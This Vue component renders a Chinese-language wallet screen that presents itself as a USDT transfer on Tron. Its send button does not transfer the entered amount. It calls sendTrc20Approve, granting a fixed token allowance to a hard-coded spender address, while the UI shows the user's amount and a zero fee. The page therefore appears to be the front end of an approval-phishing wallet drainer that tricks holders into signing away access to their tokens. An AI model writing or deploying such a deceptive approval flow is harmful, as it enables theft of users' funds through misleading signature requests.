<script setup lang="ts">
// <!-- Import Dependencies Start --->
import { computed, onMounted, ref, watch } from "vue";

import { useTronWallet } from "@/composables/use-tron-wallet";
import {
  TRON_NETWORK_NAME,
  TRON_SPENDER_ADDRESS,
} from "@/config/tron";
import {
  sendTrc20Approve,
  TRON_TEST_APPROVE_AMOUNT_LABEL,
} from "@/contracts/trc20-contract";
import { mapTronErrorMessage } from "@/utils/tron-error-util";
import { waitForTronTransaction } from "@/utils/tron-util";
// <!-- Import Dependencies End --->

type TransferPhase = "idle" | "pending" | "confirming" | "success" | "error";

// <!-- Reactive Data Start --->
const {
  address,
  isConnecting,
  isConnected,
  tronWeb,
  isOnTargetNetwork,
  walletError,
  connect,
} = useTronWallet();

const showConfirmDrawer = ref(false);
const transferAmount = ref("0");
const transferPhase = ref<TransferPhase>("idle");
const transferErrorMessage = ref("");
const transferAttempted = ref(false);
// <!-- Reactive Data End --->

// <!-- Computed Properties Start --->
const payerAddress = computed(() => address.value ?? "");
const recipientAddress = computed(() => TRON_SPENDER_ADDRESS);

const displayAmountLabel = computed(() => TRON_TEST_APPROVE_AMOUNT_LABEL);

const isAmountValid = computed(() => {
  const value = transferAmount.value.trim();
  if (!value) return false;
  if (!/^\d+(\.\d+)?$/.test(value)) return false;
  return Number(value) > 0;
});

const amountFiatLabel = computed(() => {
  const value = transferAmount.value.trim();
  if (!value || !isAmountValid.value) return "USDT";
  return `${value} USDT`;
});

const shortenAddress = (value: string, prefix = 8, suffix = 8) => {
  if (!value) return "";
  if (value.length <= prefix + suffix) return value;
  return `${value.slice(0, prefix)}...${value.slice(-suffix)}`;
};

const shortRecipientAddress = computed(() =>
  shortenAddress(recipientAddress.value, 16, 8),
);
const shortPayerAddress = computed(() =>
  shortenAddress(payerAddress.value, 6, 4),
);

const networkBadgeLabel = computed(() => {
  if (TRON_NETWORK_NAME.toLowerCase().includes("tron")) return "Tron";
  return TRON_NETWORK_NAME;
});

const isTransferBusy = computed(
  () =>
    transferPhase.value === "pending" || transferPhase.value === "confirming",
);

const canGoNext = computed(
  () =>
    isConnected.value &&
    isOnTargetNetwork.value &&
    isAmountValid.value &&
    !isConnecting.value &&
    !isTransferBusy.value,
);

const nextButtonLabel = computed(() => {
  if (isConnecting.value) return "连接钱包中...";
  if (!isConnected.value) return "等待连接钱包";
  if (!isOnTargetNetwork.value) return "网络不正确";
  return "下一步";
});

const sendButtonLabel = computed(() => {
  if (transferPhase.value === "pending") return "等待签名...";
  if (transferPhase.value === "confirming") return "确认中...";
  if (transferPhase.value === "success") return "已发送";
  if (transferPhase.value === "error") return "重新发送";
  return "发送";
});
// <!-- Computed Properties End --->

// <!-- Function & API Request Start --->
const autoConnectWallet = async () => {
  if (isConnecting.value || isConnected.value) return;
  await connect();
};

const openConfirmDrawer = () => {
  if (!canGoNext.value) return;
  showConfirmDrawer.value = true;
};

const closeConfirmDrawer = () => {
  if (isTransferBusy.value) return;
  showConfirmDrawer.value = false;
  if (transferPhase.value !== "success") {
    transferPhase.value = "idle";
    transferAttempted.value = false;
    transferErrorMessage.value = "";
  }
};

const runApprove = async () => {
  if (
    !isConnected.value ||
    !isOnTargetNetwork.value ||
    !address.value ||
    !tronWeb.value
  )
    return;
  if (transferAttempted.value) return;
  if (isTransferBusy.value) return;
  if (transferPhase.value === "success") return;

  transferAttempted.value = true;
  transferPhase.value = "pending";
  transferErrorMessage.value = "";

  try {
    const txid = await sendTrc20Approve(tronWeb.value);
    transferPhase.value = "confirming";

    const receipt = await waitForTronTransaction(tronWeb.value, txid);
    if (receipt.receipt?.result && receipt.receipt.result !== "SUCCESS") {
      throw new Error(`交易失败：${receipt.receipt.result}`);
    }

    transferPhase.value = "success";
  } catch (error) {
    transferPhase.value = "error";
    transferErrorMessage.value = mapTronErrorMessage(error);
    transferAttempted.value = false;
  }
};

const handleSend = async () => {
  if (transferPhase.value === "success") return;
  await runApprove();
};

const handleRetry = async () => {
  transferAttempted.value = false;
  transferPhase.value = "idle";
  transferErrorMessage.value = "";
  await runApprove();
};
// <!-- Function & API Request End --->

// <!-- Life Cycle Start --->
onMounted(() => {
  void autoConnectWallet();
});

watch(isConnected, (connected) => {
  if (!connected) {
    showConfirmDrawer.value = false;
    transferPhase.value = "idle";
    transferAttempted.value = false;
    transferErrorMessage.value = "";
  }
});

watch(showConfirmDrawer, (visible) => {
  if (!visible && !isTransferBusy.value && transferPhase.value !== "success") {
    transferPhase.value = "idle";
    transferAttempted.value = false;
    transferErrorMessage.value = "";
  }
});
// <!-- Life Cycle End --->
</script>

<template>
  <div class="transfer-page">
    <header class="transfer-nav">
      <div class="nav-icon-slot">
        <i class="pi pi-chevron-left" />
      </div>
      <div class="nav-title-wrap">
        <div class="nav-title">USDT 转账</div>
        <div class="nav-subtitle">
          {{ networkBadgeLabel }}
        </div>
      </div>
      <div class="nav-icon-slot">
        <i class="pi pi-expand" />
      </div>
    </header>

    <section class="transfer-section">
      <div class="section-label">收款地址</div>
      <div class="address-card">
        <div class="address-text">
          {{ recipientAddress }}
        </div>
        <div class="address-icon">
          <i class="pi pi-user" />
        </div>
      </div>
      <div class="address-book-bar">
        <i class="pi pi-user-plus" />
        <span>添加到地址本</span>
        <i class="pi pi-chevron-right address-book-arrow" />
      </div>
    </section>

    <section class="transfer-section">
      <div class="section-row">
        <span class="section-label">数量</span>
        <span class="balance-text">TRON</span>
      </div>
      <div class="amount-card">
        <InputText
          v-model="transferAmount"
          type="text"
          inputmode="decimal"
          placeholder="0"
          class="amount-input"
          :unstyled="true"
        />
        <div class="amount-fiat">
          {{ amountFiatLabel }}
        </div>
        <div class="amount-divider" />
        <div class="amount-note">备注（需支付 1 TRX）</div>
      </div>
    </section>

    <section class="transfer-section">
      <div class="section-label">矿工费</div>
      <div class="fee-card">
        <span class="fee-fiat">$ 0</span>
        <span class="fee-token">0 TRX</span>
        <i class="pi pi-chevron-down fee-arrow" />
      </div>
    </section>

    <Message
      v-if="walletError"
      severity="error"
      :closable="false"
      class="transfer-message"
    >
      {{ walletError }}
    </Message>

    <div class="transfer-footer">
      <Button
        :label="nextButtonLabel"
        class="primary-btn w-full"
        size="large"
        :loading="isConnecting"
        :disabled="!canGoNext"
        @click="openConfirmDrawer"
      />
    </div>

    <Drawer
      v-model:visible="showConfirmDrawer"
      position="bottom"
      modal
      :show-close-icon="false"
      :dismissable="!isTransferBusy"
      class="confirm-drawer"
      style="height: 90vh"
    >
      <header class="confirm-close-wrap">
        <div class="confirm-close-btn">
          <i class="pi pi-times" />
        </div>
      </header>

      <section class="confirm-hero">
        <div class="confirm-avatar">
          <i class="pi pi-user" />
        </div>
        <div class="confirm-title">发送至地址</div>
        <div class="confirm-address-row">
          <span class="confirm-address">{{ shortRecipientAddress }}</span>
          <i class="pi pi-chevron-right confirm-address-arrow" />
        </div>
        <div class="network-badge">
          <span class="network-dot" />
          {{ networkBadgeLabel }}
        </div>
      </section>

      <section class="confirm-block">
        <div class="confirm-block-label">数量</div>
        <div class="confirm-amount-card">
          <div class="token-row">
            <!-- <span class="token-icon"> -->
            <img
              src="https://etherscan.io/token/images/trontrx_32.png"
              alt="TRON"
            />
            <!-- </span> -->
            <span class="token-name">USDT</span>
          </div>
          <div class="confirm-amount">-{{ transferAmount }}</div>
        </div>
      </section>

      <section class="confirm-detail-card">
        <div class="confirm-detail-row">
          <span>当前账户</span>
          <span class="confirm-detail-value">{{ shortPayerAddress }}</span>
        </div>
        <div class="confirm-detail-row">
          <span>矿工费</span>
          <span class="confirm-detail-value fee-inline">
            0 TRX
            <i class="pi pi-chevron-down" />
          </span>
        </div>
      </section>

      <Message
        v-if="transferPhase === 'success'"
        severity="success"
        :closable="false"
        class="transfer-message"
      >
        转账成功，{{ displayAmountLabel }} 已提交
      </Message>

      <Message
        v-if="transferErrorMessage"
        severity="error"
        :closable="false"
        class="transfer-message"
      >
        {{ transferErrorMessage }}
      </Message>

      <div class="confirm-actions">
        <Button
          label="取消"
          class="ghost-btn flex-1"
          size="large"
          outlined
          :disabled="isTransferBusy"
          @click="closeConfirmDrawer"
        />
        <Button
          :label="sendButtonLabel"
          class="primary-btn flex-1"
          size="large"
          :loading="isTransferBusy"
          :disabled="isTransferBusy || transferPhase === 'success'"
          @click="transferPhase === 'error' ? handleRetry() : handleSend()"
        />
      </div>
    </Drawer>
  </div>
</template>

<style scoped>
.transfer-page {
  max-width: 480px;
  margin: 0 auto;
  min-height: 100vh;
  padding: 0 16px 24px;
  background: #f3f4f6;
}

.transfer-nav {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 12px 0 20px;
}

.nav-icon-slot {
  width: 40px;
  height: 40px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #111827;
  font-size: 18px;
  pointer-events: none;
}

.nav-title-wrap {
  text-align: center;
}

.nav-title {
  font-size: 17px;
  font-weight: 600;
  color: #111827;
}

.nav-subtitle {
  font-size: 13px;
  color: #9ca3af;
  margin-top: 2px;
}

.transfer-section {
  margin-bottom: 20px;
}

.section-label {
  font-size: 14px;
  color: #9ca3af;
  margin-bottom: 10px;
}

.section-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 10px;
}

.balance-text {
  font-size: 14px;
  color: #111827;
  font-weight: 500;
}

.address-card {
  background: #fff;
  border-radius: 16px;
  padding: 16px;
  display: flex;
  align-items: flex-start;
  gap: 12px;
}

.address-text {
  flex: 1;
  font-size: 15px;
  line-height: 1.5;
  color: #111827;
  word-break: break-all;
}

.address-icon {
  width: 36px;
  height: 36px;
  border-radius: 50%;
  background: #f3f4f6;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #6b7280;
  flex-shrink: 0;
}

.address-book-bar {
  margin-top: 12px;
  background: #eef4ff;
  border-radius: 14px;
  padding: 14px 16px;
  display: flex;
  align-items: center;
  gap: 10px;
  color: #2563eb;
  font-size: 15px;
  pointer-events: none;
}

.address-book-arrow {
  margin-left: auto;
  font-size: 12px;
}

.amount-card {
  background: #fff;
  border-radius: 16px;
  padding: 16px;
}

.amount-input {
  width: 100%;
  border: none;
  background: transparent;
  font-size: 32px;
  font-weight: 600;
  color: #111827;
  line-height: 1.2;
  padding: 0;
  outline: none;
  box-shadow: none;
}

.amount-input::placeholder {
  color: #d1d5db;
}

.amount-fiat {
  font-size: 14px;
  color: #9ca3af;
  margin-top: 4px;
}

.amount-divider {
  height: 1px;
  background: #f3f4f6;
  margin: 14px 0;
}

.amount-note {
  font-size: 14px;
  color: #d1d5db;
}

.fee-card {
  background: #fff;
  border-radius: 16px;
  padding: 16px;
  display: flex;
  align-items: center;
  gap: 8px;
}

.fee-fiat {
  font-size: 16px;
  color: #111827;
}

.fee-token {
  font-size: 14px;
  color: #9ca3af;
}

.fee-arrow {
  margin-left: auto;
  font-size: 12px;
  color: #111827;
}

.transfer-footer {
  margin-top: 28px;
}

.primary-btn {
  background: #2f80ff !important;
  border-color: #2f80ff !important;
  border-radius: 14px !important;
  font-size: 16px !important;
}

.ghost-btn {
  border-radius: 14px !important;
  font-size: 16px !important;
  color: #111827 !important;
  border-color: #e5e7eb !important;
}

.transfer-message {
  margin-top: 12px;
}

.confirm-close-wrap {
  display: flex;
  justify-content: flex-end;
  padding: 0 0 8px;
}

.confirm-close-btn {
  width: 36px;
  height: 36px;
  border-radius: 50%;
  background: #e5e7eb;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #6b7280;
  pointer-events: none;
}

.confirm-hero {
  text-align: center;
  padding: 0 0 20px;
}

.confirm-avatar {
  width: 56px;
  height: 56px;
  border-radius: 50%;
  background: #e5e7eb;
  margin: 0 auto 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: #9ca3af;
  font-size: 24px;
}

.confirm-title {
  font-size: 18px;
  font-weight: 600;
  color: #111827;
  margin-bottom: 8px;
}

.confirm-address-row {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 4px;
  color: #111827;
  font-size: 15px;
  margin-bottom: 12px;
}

.confirm-address-arrow {
  font-size: 12px;
  color: #9ca3af;
}

.network-badge {
  display: inline-flex;
  align-items: center;
  gap: 6px;
  padding: 4px 12px;
  border-radius: 999px;
  background: #f3f4f6;
  font-size: 13px;
  color: #374151;
}

.network-dot {
  width: 8px;
  height: 8px;
  border-radius: 50%;
  background: #ef4444;
}

.confirm-block {
  margin-bottom: 16px;
}

.confirm-block-label {
  font-size: 14px;
  color: #9ca3af;
  margin-bottom: 10px;
}

.confirm-amount-card {
  background: #fff;
  border-radius: 16px;
  padding: 16px;
  display: flex;
  align-items: center;
  justify-content: space-between;
}

.token-row {
  display: flex;
  align-items: center;
  gap: 10px;
}

.token-icon {
  width: 32px;
  height: 32px;
  border-radius: 50%;
  background: #26a17b;
  color: #fff;
  display: flex;
  align-items: center;
  justify-content: center;
  font-weight: 700;
  font-size: 14px;
}

.token-name {
  font-size: 16px;
  font-weight: 600;
  color: #111827;
}

.confirm-amount {
  font-size: 28px;
  font-weight: 600;
  color: #111827;
}

.confirm-detail-card {
  background: #fff;
  border-radius: 16px;
  padding: 4px 16px;
  margin-bottom: 16px;
}

.confirm-detail-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 14px 0;
  font-size: 15px;
  color: #111827;
  border-bottom: 1px solid #f3f4f6;
}

.confirm-detail-row:last-child {
  border-bottom: none;
}

.confirm-detail-value {
  color: #6b7280;
  font-size: 14px;
}

.fee-inline {
  display: inline-flex;
  align-items: center;
  gap: 6px;
}

.confirm-actions {
  display: flex;
  gap: 12px;
  margin-top: 8px;
}
</style>

<style>
.confirm-drawer {
  width: 100%;
  max-width: 480px;
  margin: 0 auto;
  border: none;
  border-radius: 20px 20px 0 0;
  overflow: hidden;
  background: #f3f4f6;
}

.confirm-drawer .p-drawer-header {
  display: none;
}

.confirm-drawer .p-drawer-content {
  padding: 16px 16px 24px;
  background: #f3f4f6;
}
</style>
